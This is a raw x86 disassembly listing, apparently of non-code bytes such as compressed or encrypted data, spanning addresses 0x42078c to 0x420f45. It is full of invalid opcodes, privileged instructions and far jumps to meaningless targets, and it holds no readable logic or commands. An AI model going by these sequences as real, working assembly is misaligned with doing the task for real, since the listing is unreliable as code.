  42078c:	jae    0x420715
  42078e:	out    dx,eax
  42078f:	int    0xa2
  420791:	rcr    BYTE PTR [ebp+0x37],cl
  420794:	inc    eax
  420795:	mov    ds:0x2eb2b259,al
  42079a:	jmp    0x1222:0x8853fa59
  4207a1:	xor    DWORD PTR [ecx],0xc13eb6ab
  4207a7:	ss sahf 
  4207a9:	fs xchg esp,eax
  4207ab:	add    al,BYTE PTR [ebx+0x1d8128e0]
  4207b1:	or     edx,DWORD PTR [edi]
  4207b3:	sar    BYTE PTR [edx+0x37],1
  4207b6:	(bad)  
  4207b7:	out    dx,eax
  4207b8:	out    0x11,eax
  4207ba:	(bad)  [ecx]
  4207bc:	popf   
  4207bd:	mov    DWORD PTR ds:[edx-0x3e677d11],0xdddbcd1e
  4207c8:	jae    0x420819
  4207ca:	sbb    BYTE PTR [edx],0x21
  4207cd:	out    0x4a,al
  4207cf:	sub    eax,0x6be5f2fb
  4207d4:	push   0x9ad55629
  4207d9:	mov    edi,0x877285e3
  4207de:	push   es
  4207df:	jmp    0x44c5:0xa10abf79
  4207e6:	and    al,0xfb
  4207e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207e9:	scas   al,BYTE PTR es:[edi]
  4207ea:	push   ebx
  4207eb:	sbb    ch,BYTE PTR [eax+eax*2+0x2ab20fd9]
  4207f2:	shl    BYTE PTR ds:0x25ad643f,1
  4207f8:	std    
  4207f9:	mov    bl,0x7d
  4207fb:	jmp    0xe875c86
  420800:	out    0xff,eax
  420802:	pop    ecx
  420803:	mov    ebx,0x8c896f99
  420808:	sbb    BYTE PTR [edx-0x74],0x5
  42080c:	cmp    bh,0xd8
  42080f:	jmp    0x4207b6
  420811:	les    esi,FWORD PTR [edx-0x2edbb53d]
  420817:	and    eax,0xc27da291
  42081c:	push   ebx
  42081d:	nop
  42081e:	dec    edi
  42081f:	mov    bl,cl
  420821:	mov    esp,0x92887751
  420826:	xchg   DWORD PTR [ecx+eiz*1+0x63781492],edi
  42082d:	scas   eax,DWORD PTR es:[edi]
  42082e:	retf   
  42082f:	jge    0x42083d
  420831:	push   edx
  420832:	jmp    0x420857
  420834:	cmp    esp,DWORD PTR [esi-0x4c]
  420837:	sti    
  420838:	ss xchg ah,dl
  42083b:	aas    
  42083c:	pop    ebx
  42083d:	jnp    0x4207c7
  42083f:	cmp    esp,DWORD PTR [ebx+ecx*2+0x670bb704]
  420846:	into   
  420847:	test   eax,0xc07eb7bf
  42084c:	pop    eax
  42084d:	stos   BYTE PTR es:[edi],al
  42084e:	dec    edi
  42084f:	pop    ecx
  420850:	add    eax,0x30efb8fd
  420855:	div    DWORD PTR [eax]
  420857:	cmp    eax,0xba00c52b
  42085c:	call   0xff35:0x83f9f8a4
  420863:	icebp  
  420864:	mov    ch,ch
  420866:	imul   esi,DWORD PTR ds:0x8a770a89,0xffffffe2
  42086d:	mov    bl,0x8c
  42086f:	stc    
  420870:	scas   eax,DWORD PTR es:[edi]
  420871:	sahf   
  420872:	sub    ebp,ecx
  420874:	(bad)  
  420875:	fwait
  420876:	pop    edx
  420877:	fcmovb st,st(2)
  420879:	popf   
  42087a:	push   ds
  42087b:	fcomp  DWORD PTR [ecx+0x6]
  42087e:	push   cs
  42087f:	arpl   WORD PTR [ecx*8-0x78da6929],cx
  420886:	fiadd  DWORD PTR [edx]
  420888:	(bad)  
  420889:	adc    dl,bh
  42088b:	xor    ch,bl
  42088d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42088e:	xchg   ecx,eax
  42088f:	js     0x4208f2
  420891:	xchg   ebx,eax
  420892:	jecxz  0x42084f
  420894:	sub    eax,0x4cb3453d
  420899:	sti    
  42089a:	es dec edx
  42089c:	mov    ds:0x320fbc0,eax
  4208a1:	outs   dx,DWORD PTR ds:[esi]
  4208a2:	push   ds
  4208a3:	xchg   al,dh
  4208a5:	das    
  4208a6:	adc    ch,BYTE PTR [ecx-0x75d08b79]
  4208ac:	push   edx
  4208ad:	cmp    BYTE PTR [esi-0x14],0x60
  4208b1:	pop    ecx
  4208b2:	loop   0x420932
  4208b4:	mov    al,0x7d
  4208b6:	mov    al,0x9f
  4208b8:	in     al,0xa0
  4208ba:	push   ds
  4208bb:	or     dh,al
  4208bd:	cmp    al,0x13
  4208bf:	add    edx,DWORD PTR [ebp+0x3d]
  4208c2:	push   edi
  4208c3:	hlt    
  4208c4:	dec    esi
  4208c5:	into   
  4208c6:	push   edi
  4208c7:	dec    ebp
  4208c8:	mov    esi,0x2d7975ad
  4208cd:	cmp    DWORD PTR [ebp+0x4f],edi
  4208d0:	xor    al,0xec
  4208d2:	pop    es
  4208d3:	xlat   BYTE PTR ds:[ebx]
  4208d4:	sar    BYTE PTR [esi+eax*2-0x5e70151d],1
  4208db:	aam    0xdb
  4208dd:	clc    
  4208de:	in     eax,0x2c
  4208e0:	xchg   DWORD PTR ds:0x2d088e27,esp
  4208e6:	retf   
  4208e7:	xor    eax,DWORD PTR [ecx]
  4208e9:	adc    edi,esp
  4208eb:	pop    ss
  4208ec:	mov    eax,0xe4dbe290
  4208f1:	(bad)  
  4208f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208f4:	xor    dh,dh
  4208f6:	jmp    0xb42e0422
  4208fb:	jmp    0x4208dc
  4208fd:	daa    
  4208fe:	dec    esi
  4208ff:	ins    DWORD PTR es:[edi],dx
  420900:	xor    dh,bl
  420902:	loope  0x420961
  420904:	popa   
  420905:	cmp    al,0x16
  420907:	sbb    dl,al
  420909:	popf   
  42090a:	jecxz  0x42097e
  42090c:	out    dx,eax
  42090d:	xor    dh,BYTE PTR [esi]
  42090f:	mov    esi,0xc7fb8260
  420914:	add    BYTE PTR ds:0x3cf1ec6,dl
  42091a:	xlat   BYTE PTR ds:[ebx]
  42091b:	mov    esi,0x3fb4f38d
  420920:	and    dl,BYTE PTR [ebp+0x3edf36]
	...
  42092e:	add    BYTE PTR [eax],al
  420930:	add    BYTE PTR [ecx-0x57],cl
  420933:	cmp    BYTE PTR [ebp-0x2126208],bl
  420939:	pop    edx
  42093a:	rcr    BYTE PTR [eax+edx*2+0x37562c83],0x35
  420942:	add    DWORD PTR [ecx],0x0
  420945:	lods   al,BYTE PTR ds:[esi]
  420946:	add    eax,DWORD PTR [eax]
  420948:	add    BYTE PTR ds:0xfbfd908a,bl
  42094e:	sub    BYTE PTR [ebx],al
  420950:	loop   0x4208dc
  420952:	retf   
  420953:	inc    esi
  420954:	jmp    0x75e98710
  420959:	aam    0xec
  42095b:	pushf  
  42095c:	adc    BYTE PTR [esi*8+0x7a0bb258],bl
  420963:	sub    BYTE PTR [edx],dl
  420965:	sbb    DWORD PTR [esi],ecx
  420967:	test   BYTE PTR [ebx+edi*8-0x73],dl
  42096b:	inc    esi
  42096c:	je     0x4209bf
  42096e:	ins    BYTE PTR es:[edi],dx
  42096f:	xchg   ebx,eax
  420970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420971:	xor    eax,0xd034ddfa
  420976:	xchg   DWORD PTR [eax-0x3a],eax
  420979:	push   es
  42097a:	sub    bl,al
  42097c:	mov    ecx,0x93813232
  420981:	push   0xffffff80
  420983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420984:	xor    cl,ch
  420986:	test   eax,0x82849794
  42098b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42098c:	xchg   esp,eax
  42098d:	jg     0x4209d6
  42098f:	ret    
  420990:	inc    esi
  420991:	jae    0x42092c
  420993:	ins    DWORD PTR es:[edi],dx
  420994:	fdivr  DWORD PTR [edx-0x54]
  420997:	pop    edi
  420998:	das    
  420999:	add    eax,0xffffff91
  42099c:	sbb    al,0xef
  42099e:	mov    ebx,0xd9bf0efb
  4209a3:	and    cx,WORD PTR [ecx+0x4d4401c9]
  4209aa:	pop    ecx
  4209ab:	or     esi,ebp
  4209ad:	sbb    eax,0x955d80bf
  4209b2:	ret    0x558b
  4209b5:	test   al,0x4b
  4209b7:	ins    DWORD PTR es:[edi],dx
  4209b8:	imul   BYTE PTR [edx+0x60184eb5]
  4209be:	xchg   DWORD PTR [esi],eax
  4209c0:	push   ds
  4209c1:	jae    0x4209a0
  4209c3:	data16 loop 0x420948
  4209c6:	or     al,0xa4
  4209c8:	ja     0x4209c8
  4209ca:	xchg   ebp,eax
  4209cb:	aas    
  4209cc:	daa    
  4209cd:	xor    ch,BYTE PTR [eax]
  4209cf:	sar    BYTE PTR [ebp*2+0x4f0666f7],1
  4209d6:	ins    BYTE PTR es:[edi],dx
  4209d7:	push   ecx
  4209d8:	add    eax,0xf9911b6d
  4209dd:	into   
  4209de:	popa   
  4209df:	adc    bh,ch
  4209e1:	push   edi
  4209e2:	shl    BYTE PTR [esi],0x9a
  4209e5:	jle    0x420a3c
  4209e7:	xchg   ebx,eax
  4209e8:	jbe    0x420a26
  4209ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209eb:	cmp    DWORD PTR [edx+0x5464a626],ecx
  4209f1:	ja     0x420a5d
  4209f3:	shl    BYTE PTR [edx-0x162872ac],1
  4209f9:	mov    esi,0x3fbcbfd5
  4209fe:	jns    0x420a2d
  420a00:	hlt    
  420a01:	(bad)  
  420a02:	or     edx,DWORD PTR [eax-0x42]
  420a05:	sub    DWORD PTR [esi+ebx*4-0x22],esi
  420a09:	xchg   esi,eax
  420a0a:	mov    bh,0xaf
  420a0c:	jnp    0x420a0e
  420a0e:	sbb    cl,BYTE PTR [edi-0x18]
  420a11:	push   ds
  420a12:	add    al,0x33
  420a14:	test   bh,cl
  420a16:	cmp    ebp,DWORD PTR [ebx]
  420a18:	pusha  
  420a19:	mov    dl,0xbf
  420a1b:	push   esp
  420a1c:	cmc    
  420a1d:	jg     0x4209f2
  420a1f:	adc    ebp,DWORD PTR [edi+eax*1]
  420a22:	stos   DWORD PTR es:[edi],eax
  420a23:	lds    ebp,FWORD PTR [eax-0x249ae86b]
  420a29:	mov    ah,0x3d
  420a2b:	int3   
  420a2c:	sub    al,0x5a
  420a2e:	mov    ebp,DWORD PTR [esi-0x5d]
  420a31:	jne    0x420a02
  420a33:	mov    ch,0xa4
  420a35:	lea    ebx,[edx+edi*2+0x2]
  420a39:	and    cl,bh
  420a3b:	adc    eax,0x5c411a3c
  420a40:	enter  0x92f1,0x96
  420a44:	mov    esp,0xafc73db8
  420a49:	push   esp
  420a4a:	sub    ch,BYTE PTR [edi]
  420a4c:	lods   eax,DWORD PTR ds:[esi]
  420a4d:	sbb    eax,0xd82fcf4f
  420a52:	jo     0x420a9a
  420a54:	(bad)  
  420a55:	xor    ebp,ebx
  420a57:	push   eax
  420a58:	mov    bl,0xcc
  420a5a:	inc    esp
  420a5b:	into   
  420a5c:	jo     0x420aa2
  420a5e:	imul   edi,DWORD PTR [eax+0x4e0d39e2],0xffffff94
  420a65:	call   0x33369cd3
  420a6a:	in     eax,dx
  420a6b:	or     al,0x83
  420a6d:	cmp    BYTE PTR [ebx-0x7c55bf43],ch
  420a73:	ror    BYTE PTR [ecx+0x30ddcaed],cl
  420a79:	imul   edx,eax,0x2aa6e7a5
  420a7f:	out    0xba,al
  420a81:	push   cs
  420a82:	ins    BYTE PTR es:[edi],dx
  420a83:	dec    ebx
  420a84:	pusha  
  420a85:	inc    ebx
  420a86:	daa    
  420a87:	xor    ah,cl
  420a89:	pusha  
  420a8a:	les    esp,FWORD PTR [ecx-0x5a]
  420a8d:	test   BYTE PTR [edi],al
  420a8f:	sbb    dl,0xd6
  420a92:	stc    
  420a93:	mov    cl,0x78
  420a95:	sub    al,0x3e
  420a97:	loopne 0x420ab8
  420a99:	cmp    DWORD PTR [edi-0x2ca96c47],0xfffffff2
  420aa0:	call   DWORD PTR [ebx]
  420aa2:	test   BYTE PTR [edx+0x71e440a],bh
  420aa8:	push   esi
  420aa9:	loopne 0x420add
  420aab:	push   0x4ae79173
  420ab0:	popa   
  420ab1:	xor    eax,0xdc0a9b30
  420ab6:	dec    esp
  420ab7:	push   ecx
  420ab8:	les    edi,FWORD PTR [edx+0x1c]
  420abb:	jae    0x420a55
  420abd:	xchg   esi,eax
  420abe:	fild   QWORD PTR [edi+0x289806c3]
  420ac4:	jnp    0x420aee
  420ac6:	retf   0x748c
  420ac9:	gs mov cl,0x9
  420acc:	bound  ecx,QWORD PTR [ebp-0x35914eb5]
  420ad2:	push   es
  420ad3:	imul   ebx,DWORD PTR [ebx+0x1ff49df5],0x6f
  420ada:	jno    0x420b12
  420adc:	add    eax,0x3768f724
  420ae1:	inc    esi
  420ae2:	dec    esi
  420ae3:	mov    edi,0x2a8634cc
  420ae8:	loope  0x420a97
  420aea:	adc    bh,dl
  420aec:	inc    edx
  420aed:	rcl    bh,cl
  420aef:	ss call 0xfe17:0x7e06beb1
  420af7:	imul   edi,DWORD PTR [ebx+edi*1+0x3342898],0x5c
  420aff:	pop    esi
  420b00:	and    DWORD PTR [eax-0x70],0x8876f197
  420b07:	sbb    DWORD PTR [edi-0x79],esi
  420b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b0b:	pop    ebp
  420b0c:	add    al,0x32
  420b0e:	loop   0x420a9a
  420b10:	dec    eax
  420b11:	sbb    al,0xa
  420b13:	sbb    eax,0xd5861e2c
  420b18:	std    
  420b19:	xchg   edx,eax
  420b1a:	int3   
  420b1b:	jne    0x420b71
  420b1d:	jecxz  0x420afc
  420b1f:	in     eax,0xa6
  420b21:	dec    ebp
  420b22:	lods   eax,DWORD PTR ds:[esi]
  420b23:	add    edx,DWORD PTR [eax+0x67697f46]
  420b29:	leave  
  420b2a:	lods   eax,DWORD PTR ds:[esi]
  420b2b:	push   0xffffff88
  420b2d:	out    dx,eax
  420b2e:	cmp    ah,al
  420b30:	jbe    0x420ac5
  420b32:	inc    ebx
  420b33:	scas   al,BYTE PTR es:[edi]
  420b34:	lods   eax,DWORD PTR ds:[esi]
  420b35:	push   ds
  420b36:	push   ebp
  420b37:	or     DWORD PTR [ebp-0x52],esi
  420b3a:	scas   eax,DWORD PTR es:[edi]
  420b3b:	stc    
  420b3c:	idiv   DWORD PTR [ecx-0x4b]
  420b3f:	inc    ebp
  420b40:	ret    0x8371
  420b43:	push   ds
  420b44:	push   0x12f82560
  420b49:	mov    BYTE PTR [esi],bh
  420b4b:	fwait
  420b4c:	jmp    0xffee:0xeb0701cf
  420b53:	in     eax,dx
  420b54:	test   al,0x4c
  420b56:	pop    edi
  420b57:	pop    eax
  420b58:	dec    ebx
  420b59:	fldenv [ebp+0x0]
  420b5c:	push   esp
  420b5d:	or     BYTE PTR [eax],cl
  420b5f:	shl    DWORD PTR [eax-0x53fd36d2],cl
  420b65:	out    0xe0,al
  420b67:	mov    bh,0xe5
  420b69:	inc    ebp
  420b6a:	jnp    0x420b59
  420b6c:	leave  
  420b6d:	lahf   
  420b6e:	pop    ebp
  420b6f:	push   0xffffff88
  420b71:	mov    edx,0x93570e1
  420b76:	xor    BYTE PTR [edi+ecx*8],0xe9
  420b7a:	imul   eax,DWORD PTR [ecx],0xb1d8f3e8
  420b80:	hlt    
  420b81:	bound  edx,QWORD PTR [ebp+0x15]
  420b84:	pop    ebx
  420b85:	pushf  
  420b86:	addr16 dec ebp
  420b88:	xchg   DWORD PTR [esp+edi*1+0x3d],ebp
  420b8c:	test   al,ah
  420b8e:	scas   eax,DWORD PTR es:[edi]
  420b8f:	jg     0x420b1d
  420b91:	add    BYTE PTR [edx],dh
  420b93:	ja     0x420c13
  420b95:	pop    ebp
  420b96:	fdiv   DWORD PTR ds:0x6240d34e
  420b9c:	adc    BYTE PTR [ecx-0xd],bl
  420b9f:	out    0x93,eax
  420ba1:	shr    ebx,cl
  420ba3:	test   eax,0xec0635f8
  420ba8:	test   DWORD PTR [ecx],0x54e349aa
  420bae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420baf:	xor    eax,0x909d1449
  420bb4:	and    bl,cl
  420bb6:	xchg   edx,eax
  420bb7:	bound  eax,QWORD PTR [ebx]
  420bb9:	das    
  420bba:	xor    al,0xe0
  420bbc:	sub    DWORD PTR ds:[eax-0x72],edx
  420bc0:	fdiv   DWORD PTR [ebx]
  420bc2:	mov    BYTE PTR [esi+eiz*4+0x76],dh
  420bc6:	psllw  mm4,QWORD PTR [ebx]
  420bc9:	ror    BYTE PTR [esi+edi*8+0x53],1
  420bcd:	(bad)  [edi-0x2b]
  420bd0:	inc    BYTE PTR [ecx+0x214e5092]
  420bd6:	xchg   ebp,eax
  420bd7:	add    ch,cl
  420bd9:	mov    edx,0x5b88ac1c
  420bde:	and    dl,BYTE PTR [esi]
  420be0:	sbb    edx,0x95347a8b
  420be6:	and    eax,0x11894639
  420beb:	sbb    ebp,eax
  420bed:	sar    dh,1
  420bef:	push   edi
  420bf0:	xor    bl,bh
  420bf2:	lea    edi,[esi]
  420bf4:	cld    
  420bf5:	mov    eax,0x35277475
  420bfa:	add    BYTE PTR [eax-0xc3a7ca1],bh
  420c00:	mov    dh,0x1f
  420c02:	in     eax,0x40
  420c04:	push   es
  420c05:	jbe    0x420bea
  420c07:	and    al,0x5a
  420c09:	dec    ecx
  420c0a:	jmp    0xd690:0x7d7044aa
  420c11:	outs   dx,BYTE PTR es:[esi]
  420c13:	imul   BYTE PTR [ebp-0x64]
  420c16:	mov    esi,0x20569e82
  420c1b:	pop    esp
  420c1c:	addr16 xor eax,0x87ac5e78
  420c22:	inc    esi
  420c23:	jge    0x420bfd
  420c25:	mov    edi,0xe8e843be
  420c2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c2b:	sbb    bl,BYTE PTR [edx+0x10]
  420c2e:	lahf   
  420c2f:	push   edx
  420c30:	mov    esp,0x9d35a820
  420c35:	jp     0x420c9b
  420c37:	int3   
  420c38:	mov    cs,WORD PTR [ebx+0x37a9c12c]
  420c3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c3f:	hlt    
  420c40:	dec    eax
  420c41:	sub    al,0x20
  420c43:	jns    0x420c26
  420c45:	(bad)  
  420c46:	jb     0x420c85
  420c48:	mov    dh,0xbe
  420c4a:	sar    edi,1
  420c4c:	je     0x420bff
  420c4e:	and    eax,0x13b1086d
  420c53:	cmc    
  420c54:	xor    ch,BYTE PTR ds:0xa557919d
  420c5a:	inc    edx
  420c5b:	mov    bl,BYTE PTR [edi+0x62ebec65]
  420c61:	xchg   ebx,eax
  420c62:	addr16 out dx,eax
  420c64:	sbb    DWORD PTR [edx-0x70],ebx
  420c67:	int    0xbe
  420c69:	jecxz  0x420c3d
  420c6b:	fcomp  DWORD PTR [esi]
  420c6d:	inc    ebp
  420c6e:	cmc    
  420c6f:	or     ecx,esp
  420c71:	cmc    
  420c72:	pop    eax
  420c73:	sub    ah,al
  420c75:	pusha  
  420c76:	push   edi
  420c77:	cmp    al,0x83
  420c79:	mov    eax,0xf2ca30c8
  420c7e:	cmp    bl,BYTE PTR [edx-0x60]
  420c81:	sub    dh,BYTE PTR [eax+edx*1]
  420c84:	lahf   
  420c85:	sbb    al,0x2e
  420c87:	scas   al,BYTE PTR es:[edi]
  420c88:	aas    
  420c89:	mov    cl,0xce
  420c8b:	jg     0x420cfd
  420c8d:	ins    BYTE PTR es:[edi],dx
  420c8e:	dec    eax
  420c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c90:	or     eax,0xd59ba04
  420c95:	outs   dx,DWORD PTR ds:[esi]
  420c96:	xchg   ebp,eax
  420c97:	push   ebp
  420c98:	adc    DWORD PTR [edx+0x4c],ebp
  420c9b:	inc    edx
  420c9c:	adc    edi,0xffffffaf
  420c9f:	jno    0x420c40
  420ca1:	mov    ch,0x44
  420ca3:	jo     0x420c6b
  420ca5:	repz adc al,bh
  420ca8:	push   esp
  420ca9:	push   ebp
  420caa:	cli    
  420cab:	test   DWORD PTR [eax],0x7975384d
  420cb1:	(bad)  
  420cb2:	jmp    0xd49460b1
  420cb7:	pop    eax
  420cb8:	lahf   
  420cb9:	in     eax,dx
  420cba:	mov    edi,0xc04979be
  420cbf:	fcom   QWORD PTR [esi+0x37]
  420cc2:	mov    bh,0x68
  420cc4:	or     al,0x7a
  420cc6:	pop    ebp
  420cc7:	sti    
  420cc8:	cmp    al,0x83
  420cca:	dec    edi
  420ccb:	fistp  DWORD PTR ds:0x61b09963
  420cd1:	mov    eax,0xbf6bf1b8
  420cd6:	jmp    0x420ca8
  420cd8:	pushf  
  420cd9:	retf   
  420cda:	inc    edi
  420cdb:	addr16 sahf 
  420cdd:	sub    al,0x32
  420cdf:	mov    al,ds:0xa4a7c354
  420ce4:	pop    esp
  420ce5:	jo     0x420c9b
  420ce7:	arpl   di,di
  420ce9:	inc    esi
  420cea:	cmp    DWORD PTR [ebx+0x2995f49b],edx
  420cf0:	jo     0x420d10
  420cf2:	sbb    edi,DWORD PTR [edi]
  420cf4:	and    eax,0x0
	...
  420d01:	es mov eax,0xbf9f8f0d
  420d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d08:	mov    ecx,0xfe336cff
  420d0d:	scas   eax,DWORD PTR es:[edi]
  420d0e:	lods   eax,DWORD PTR ds:[esi]
  420d0f:	mov    esi,0x186e1f4
  420d14:	add    BYTE PTR [ebx+eax*1+0x29840000],ch
  420d1b:	bound  esp,QWORD PTR [esi-0x87b9711]
  420d21:	inc    ebp
  420d22:	and    al,BYTE PTR ds:0xc60a9583
  420d28:	dec    edi
  420d29:	fisttp DWORD PTR [edi]
  420d2b:	fst    DWORD PTR [esi+0x78]
  420d2e:	xor    al,0x7a
  420d30:	mov    dh,0xa9
  420d32:	ss int3 
  420d34:	mov    edx,0xaa4dd4f6
  420d39:	or     BYTE PTR [eax+ebp*1-0x41],0x15
  420d3e:	cmp    cl,ah
  420d40:	out    0x3e,al
  420d42:	imul   esp,DWORD PTR [ebp-0x120b78cb],0x930327e5
  420d4c:	std    
  420d4d:	push   ebp
  420d4e:	aam    0xea
  420d50:	mov    esi,0x172c7877
  420d55:	hlt    
  420d56:	or     eax,0xd444d6d7
  420d5b:	je     0x420d05
  420d5d:	(bad)  
  420d5e:	or     al,0x26
  420d60:	shl    BYTE PTR [edi],cl
  420d62:	jecxz  0x420d68
  420d64:	cmp    ah,BYTE PTR [ecx]
  420d66:	cmp    al,0x85
  420d68:	xor    eax,0xd07bbe8f
  420d6d:	outs   dx,BYTE PTR ds:[esi]
  420d6e:	add    edx,DWORD PTR ds:0x30be9f13
  420d74:	shr    BYTE PTR [eax-0x6b],0x4f
  420d78:	loop   0x420deb
  420d7a:	xor    BYTE PTR [ecx-0x21c80059],dh
  420d80:	lods   eax,DWORD PTR ds:[esi]
  420d81:	idiv   DWORD PTR [esi+0x1c]
  420d84:	sub    BYTE PTR [edx+ebp*1+0x6c],ah
  420d88:	gs push edi
  420d8a:	aad    0x83
  420d8c:	sbb    ecx,eax
  420d8e:	xchg   ebx,eax
  420d8f:	cmp    DWORD PTR [ebx+0x37],ebp
  420d92:	or     al,0x67
  420d94:	js     0x420dfe
  420d96:	cmp    bl,dh
  420d98:	xor    dl,BYTE PTR [ebp-0x32]
  420d9b:	lock or al,bl
  420d9e:	mov    al,0x2
  420da0:	sbb    BYTE PTR [ebp-0x80],bl
  420da3:	or     BYTE PTR [eax-0x5d443ef0],0xf4
  420daa:	jl     0x420ded
  420dac:	clc    
  420dad:	jbe    0x420dff
  420daf:	sbb    BYTE PTR [ebx],al
  420db1:	aas    
  420db2:	xor    BYTE PTR [eax+0x92ac2c8],dh
  420db8:	push   ebp
  420db9:	jns    0x420d51
  420dbb:	popa   
  420dbc:	pop    esp
  420dbd:	(bad)  
  420dbf:	cs scas al,BYTE PTR es:[edi]
  420dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dc2:	pop    ebx
  420dc3:	mov    eax,0x482d5c41
  420dc8:	fldenv [edi+0x6525cb2d]
  420dce:	jg     0x420df2
  420dd0:	jecxz  0x420de7
  420dd2:	mov    edi,0x510695c2
  420dd7:	jnp    0x420dfc
  420dd9:	stc    
  420dda:	and    DWORD PTR [edi+0x25cc42f0],ebp
  420de0:	sub    DWORD PTR [ebx+0x5a83ed6b],ecx
  420de6:	or     BYTE PTR [esi],cl
  420de8:	int    0x5f
  420dea:	sbb    eax,esp
  420dec:	jecxz  0x420deb
  420dee:	cmp    DWORD PTR [eax],0xffffffc3
  420df1:	push   edi
  420df2:	sti    
  420df3:	test   bl,dh
  420df5:	mov    DWORD PTR [edx-0x3b],edx
  420df8:	retf   0x5bec
  420dfb:	cmp    edx,edi
  420dfd:	in     eax,dx
  420dfe:	test   edi,edx
  420e00:	pop    ds
  420e01:	in     eax,dx
  420e02:	adc    BYTE PTR [ebx],ch
  420e04:	retf   0xe0db
  420e07:	jle    0x420e74
  420e09:	push   esp
  420e0a:	pop    ds
  420e0b:	push   ss
  420e0c:	or     eax,DWORD PTR [esi+0x2b0930e4]
  420e12:	and    dl,dl
  420e14:	pop    edx
  420e15:	xchg   edx,eax
  420e16:	fisub  DWORD PTR [ebx]
  420e18:	or     al,cl
  420e1a:	mov    eax,ds:0x4329a361
  420e1f:	pop    ds
  420e20:	mov    al,ds:0x9e6d11cc
  420e25:	push   es
  420e26:	sti    
  420e27:	sahf   
  420e28:	push   ds
  420e29:	xchg   ecx,eax
  420e2a:	in     eax,0x8f
  420e2c:	das    
  420e2d:	or     al,0x62
  420e2f:	in     eax,0x2f
  420e31:	mov    ds:0xfe31e56a,eax
  420e36:	adc    al,0x57
  420e38:	mov    al,0x4a
  420e3a:	jbe    0x420e30
  420e3c:	fcmovne st,st(6)
  420e3e:	mov    esp,0x55545723
  420e43:	inc    ebp
  420e44:	je     0x420e76
  420e46:	pop    ebp
  420e47:	add    cl,cl
  420e49:	retf   
  420e4a:	adc    DWORD PTR [edi-0x69],0xffffffa2
  420e4e:	sub    DWORD PTR [edx],ebp
  420e50:	in     al,dx
  420e51:	push   esi
  420e52:	jl     0x420eaf
  420e54:	(bad)  
  420e55:	cmp    BYTE PTR [ebx-0x506c717c],cl
  420e5b:	pusha  
  420e5c:	popa   
  420e5d:	in     al,0x7a
  420e5f:	mov    ds:0x16616753,eax
  420e64:	call   FWORD PTR [edx]
  420e66:	cmp    eax,0x6aabfb78
  420e6b:	mov    cl,0xd2
  420e6d:	xchg   esi,eax
  420e6e:	mov    ecx,0xb4c897e7
  420e73:	adc    BYTE PTR [ebx-0x39eabad7],dh
  420e79:	xchg   edi,eax
  420e7a:	jne    0x420e34
  420e7c:	and    DWORD PTR [edx+ebx*8+0x13939825],eax
  420e83:	sbb    BYTE PTR [edi+0x4b25f162],ah
  420e89:	sub    bh,BYTE PTR [ebp+0x5b]
  420e8c:	dec    ebp
  420e8d:	jle    0x420f0b
  420e8f:	mov    ebx,0x593bab9b
  420e94:	xchg   ebx,eax
  420e95:	or     eax,0xfe255ffb
  420e9a:	aad    0xe3
  420e9c:	xor    edi,edi
  420e9e:	xchg   esp,eax
  420e9f:	xchg   esp,eax
  420ea0:	loop   0x420ec0
  420ea2:	pop    ecx
  420ea3:	sub    eax,edx
  420ea5:	pop    edx
  420ea6:	cmp    eax,0x2649d5a2
  420eab:	and    ah,BYTE PTR [eax+edi*1+0x1d]
  420eaf:	lods   al,BYTE PTR ds:[esi]
  420eb0:	das    
  420eb1:	bnd ss jb 0x420f30
  420eb5:	fwait
  420eb6:	pop    ecx
  420eb7:	loope  0x420f01
  420eb9:	jp     0x420ec4
  420ebb:	and    esi,DWORD PTR [edx]
  420ebd:	push   ebx
  420ebe:	fisub  WORD PTR [ebx]
  420ec0:	in     al,0xe7
  420ec2:	adc    BYTE PTR [ebx],dh
  420ec4:	adc    ah,BYTE PTR [edi]
  420ec6:	adc    al,0xc4
  420ec8:	test   eax,0x5fab61c7
  420ecd:	sbb    DWORD PTR [edx-0x40],0x55
  420ed1:	inc    ebx
  420ed2:	lahf   
  420ed3:	outs   dx,DWORD PTR cs:[esi]
  420ed5:	mov    WORD PTR [edx-0x44cec272],fs
  420edb:	ret    
  420edc:	pop    ecx
  420edd:	imul   edx,esp,0xffffff81
  420ee0:	xor    al,0x93
  420ee2:	mov    esp,0x91f0fb29
  420ee7:	dec    eax
  420ee8:	repz push ss
  420eea:	(bad)  [esi+0x74]
  420eed:	sub    DWORD PTR [eax],edi
  420eef:	ds xchg ecx,eax
  420ef1:	inc    edi
  420ef2:	clc    
  420ef3:	mov    dh,0x71
  420ef5:	inc    eax
  420ef6:	sbb    cl,BYTE PTR [esi-0x5f608d65]
  420efc:	inc    eax
  420efd:	push   edi
  420efe:	int    0x3
  420f00:	out    dx,al
  420f01:	dec    edx
  420f02:	(bad)  
  420f03:	rol    BYTE PTR [edi-0x77],0x75
  420f07:	cdq    
  420f08:	daa    
  420f09:	or     al,0xaf
  420f0b:	cs inc edx
  420f0d:	pop    es
  420f0e:	xor    DWORD PTR [ecx-0x63392008],ebx
  420f14:	dec    eax
  420f15:	dec    eax
  420f16:	nop    DWORD PTR [edi]
  420f19:	xor    eax,0xd5568507
  420f1e:	adc    ah,BYTE PTR [edx+esi*1]
  420f21:	int    0x48
  420f23:	adc    DWORD PTR [esi-0x35],ebp
  420f26:	xchg   ebx,eax
  420f27:	std    
  420f28:	pop    ebx
  420f29:	ja     0x420f86
  420f2b:	in     al,dx
  420f2c:	mov    eax,ds:0xda15dd8c
  420f31:	fs push esi
  420f33:	daa    
  420f34:	stos   BYTE PTR es:[edi],al
  420f35:	mov    ds:0x9107720,eax
  420f3a:	enter  0x3f36,0x62
  420f3e:	jnp    0x420f2e
  420f40:	(bad)  
  420f41:	(bad)  
  420f42:	and    edx,DWORD PTR [edx+0x12]
  420f45:	test   al,0xdc
